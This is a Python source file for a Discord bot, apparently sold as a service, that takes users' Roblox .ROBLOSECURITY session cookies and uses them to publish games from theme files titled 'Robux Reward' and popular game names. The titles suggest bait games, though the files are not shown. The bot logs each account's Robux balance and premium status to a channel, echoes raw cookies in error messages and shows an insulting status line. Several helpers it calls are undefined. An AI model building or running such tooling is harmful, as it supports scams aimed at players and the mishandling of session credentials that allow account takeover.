import os
import json
import requests
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
load_dotenv()

rbxlx_files = {
    "tt": {
        "theme_name": "Robux Reward V1",
        "file_location": "Files/Roblox Theme Paid.rbxlx"
    }, 
    "ps": {
        "theme_name": "Pet Simulator 99",
        "file_location": "Files/Pet_Sim_Theme (1).rbxlx"
    },
    "rs": {
        "theme_name": "Robux Reward V2",
        "file_location": "Files/Robux Theme Paid V2.rbxlx"
    },
    "bg": {
        "theme_name": "Adopt Me",
        "file_location": "Files/Adm.rbxlx"
    },
    "ts": {
        "theme_name": "Lumber Tycoon 2",
        "file_location": "Files/Lumber.rbxlx"
    },
    # Add more themes here as needed
}

theme_choices = [
    discord.app_commands.Choice(name=f"{theme_data['theme_name']}", value=theme_code)
    for theme_code, theme_data in rbxlx_files.items()
]

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)
tree = discord.app_commands.CommandTree(client)

@client.event
async def on_ready():
    await tree.sync()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='You Gay'), status=discord.Status.dnd)
    print('Logged in')
    print('------')
    print(client.user.display_name)

@tree.command(
    name="publish",
    description="Publish your Roblox game files here"
)
@app_commands.describe(theme='Choose a Theme')
@app_commands.choices(theme=theme_choices)

async def slash_publish(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):

  role_name = os.getenv('CUSTUMER_ROLE_NAME')
  guild_id = int(os.getenv("GUILD_ID"))
  guild = interaction.guild

  if guild is None:
    print(f"Guild not found with ID: {guild_id}")
    return

  member = guild.get_member(interaction.user.id)
  if member is None:
    print(f"Member not found in guild with ID: {guild_id}")
    return

  role = discord.utils.get(guild.roles, name=role_name)
  if role is None or role not in member.roles:

    message = f"Role {role_name} is required to run this command.❌"
    embed_var = discord.Embed(title=message, color=8918293)
    return await interaction.response.send_message(embed=embed_var, ephemeral=True)

  message = ":white_check_mark: Checking you're Cookie\nCommand Status: 25% Done! :green_circle: "
  embed_var = discord.Embed(title=message, color=0x00FFFF)
  await interaction.response.send_message(embed=embed_var, ephemeral=True)

  refreshed_cookie = refresh_cookie(cookie)

  if refreshed_cookie is None:
    message = "Your Cookie is Invalid ❌"
    embed_var = discord.Embed(title=message, color=0x00FFFF)
    return await interaction.followup.send(embed=embed_var, ephemeral=True)

  try:
      csrf_token = get_csrf_token(refreshed_cookie)
  except Exception as e:
      await interaction.followup.send(f'Oops! Something went wrong: {e}')
  headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
      "X-CSRF-TOKEN": csrf_token,
      "Cookie": f".ROBLOSECURITY={refreshed_cookie}"
  }

  # Make the GET request
  url = 'https://www.roblox.com/mobileapi/userinfo'
  response = requests.get(url, headers=headers)
  data = response.json()
  try:
    username = data['UserName']
    userid = data['UserID']
    user_robux = data['RobuxBalance']
    user_isprem = data['IsPremium']
    avatarurl = data['ThumbnailUrl']

  except:
    await interaction.followup.send(f'Oops! Something went wrong, {refreshed_cookie}!')


  print(f" [DATA] {userid} - UserID")

  session = requests.Session()
  session.headers.update(
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json;charset=utf-8",
      "Origin": "https://www.roblox.com",
    }
  )
  session.cookies[".ROBLOSECURITY"] = refreshed_cookie

  headers1 = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Roblox/WinInet",
        "X-CSRF-TOKEN": csrf_token,
        "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
  }
  body1 = json.dumps({"templatePlaceId": "379736082"})

  request1 = session.post(
        "https://apis.roblox.com/universes/v1/universes/create",
        headers=headers1,
        data=body1
  )
  code1 = request1.status_code
  Uni_Game_Id = None
  if code1 == 200:
    response_body = request1.json()
    game_id = response_body["rootPlaceId"]
    Uni_Game_Id = response_body["universeId"]
    game_url = f"https://www.roblox.com/games/{game_id}/"

    success_embed = discord.Embed(
        title="Place Created",
        description=f"You're Game is Published in Roblox\nCommand Status: 75% :blue_circle:", 
        color=0x00FFFF
    )

    await interaction.followup.send(embed=success_embed, ephemeral=True)
  else:
    await interaction.followup.send(f"Upload failed with HTTP code {code1}", ephemeral=True)

  print(f" [DATA] {Uni_Game_Id} - Game Uni-ID")
  if Uni_Game_Id is not None:
    headers2 = {
      "Origin": "https://create.roblox.com",
      "X-CSRF-TOKEN": csrf_token,
      "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
    }
    session.post(f"https://develop.roblox.com/v1/universes/{Uni_Game_Id}/activate", headers=headers2)

    gamedata = {
      "name": gamename,
      "description": description,
      "universeAvatarType": "MorphToR6",
      "universeAnimationType": "Standard",
      "maxPlayerCount": 1,
      "allowPrivateServers": False,
      "privateServerPrice": 0,
      "permissions": {
        "IsThirdPartyTeleportAllowed": True,
        "IsThirdPartyPurchaseAllowed": True,
      },
    }
    body2 = json.dumps(gamedata)
    session.patch(
      f"https://develop.roblox.com/v2/universes/{Uni_Game_Id}/configuration",
      headers=headers1,
      data=body2
    )

    uploadRequest = session.post(
    f"https://data.roblox.com/Data/Upload.ashx?assetid={str(game_id)}",
    headers={
      'Content-Type': 'application/xml',
      'x-csrf-token': csrf_token,
      'User-Agent': 'Roblox/WinINet'
    },
    cookies={'.ROBLOSECURITY': refreshed_cookie},
    data=process_file(theme.value))

    print(f" [DATA] {uploadRequest.status_code} - Game Response Code")
    print(f" [DATA] {uploadRequest.content} - Game Response")

    if uploadRequest.status_code == 200:

        game_icon = get_game_icon(game_id)

        embed_var = discord.Embed(title="Your Game Has Been Published🎉", description="**SuccessFully Published🎉**", color=0x00FFFF)
        embed_var.add_field(name='🎮Game Name', value='' + str(gamename) + '')
        embed_var.add_field(name='📄Description', value='' + str(description) + '')
        embed_var.add_field(name='**🪪Game ID**', value='' + str(game_id) + '')
        embed_var.add_field(name='**🌐Theme**', value='' + str(theme.name) + '')
        embed_var.add_field(name="🏷️Game Link", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
        embed_var.set_footer(text="Your game is now been Published in Roblox.com - Hooray 🎉")
        embed_var.set_thumbnail(url=f"{game_icon}")
        await interaction.followup.send(embed=embed_var, ephemeral=True)
        channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))

        embed_var = discord.Embed(
          title="Dashx RGUI",
          description= f'**<@{interaction.user.id}> Successfully published his game! Congrats him!🌟**\n\n**Account Information**\n**🏷️Account Username -** ' + str(username) + '\n**🪪Account ID - ** ' + str(userid) + '\n**🤑Robux - ** ' + str(user_robux) + '\n**📄isPremium? - **' + str(user_isprem) + '\n\n**📄Game Information**\n**🏷️Game Name - ||Hidden||**\n**📄Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
          color=0x00FFFF
        )
        embed_var.set_thumbnail(url=f'{avatarurl}')

        embed_var.set_footer(text="Ratatatata")
        await channel.send(embed=embed_var)
  else:
        message2 = (f'Oops! Something went wrong, {refreshed_cookie}!')
        embed_var = discord.Embed(title=message2, color=0x00FFFF)
        await interaction.followup.send(embed=embed_var, ephemeral=True)

client.run(os.getenv('TOKEN'))